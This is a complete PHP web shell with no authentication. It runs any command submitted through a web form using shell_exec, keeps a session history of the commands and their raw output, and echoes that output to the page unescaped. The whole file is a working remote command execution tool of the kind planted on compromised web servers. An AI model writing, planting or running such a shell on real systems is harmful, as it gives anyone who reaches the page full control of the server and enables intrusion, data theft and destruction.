<?php
// Start a session to store command history
session_start();
//proprerly clear session during pressing refresh button
if(isset($_POST['clear_session'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Initialize command history array if it doesn't exist
if (!isset($_SESSION['command_history'])) {
    $_SESSION['command_history'] = [];
}

// Add the newest command and result to history
if(isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $result = shell_exec($_POST['cmd']);
    $_SESSION['command_history'][] = [
        'command' => $_POST['cmd'],
        'output' => $result
    ];
}

// Display the form
echo "<form method='POST'>
<input type='text' name='cmd'>
<input type='submit' value='Execute'>
</form>";

echo "<form method='POST' action=''><button type='submit' name='clear_session'>Refresh</button></form>";

// Display all previous commands and outputs (append style)
if($_SESSION['command_history']){
    $reversed_history = array_reverse($_SESSION['command_history']);
    foreach ($reversed_history as $item) {
        echo "<div style='margin-top: 15px; border-top: 1px solid #ccc;'>";
        echo "<strong>$ " . htmlspecialchars($item['command']) . "</strong>";
        echo "<pre>" . $item['output'] . "</pre>";
        echo "</div>";
    }
}
?>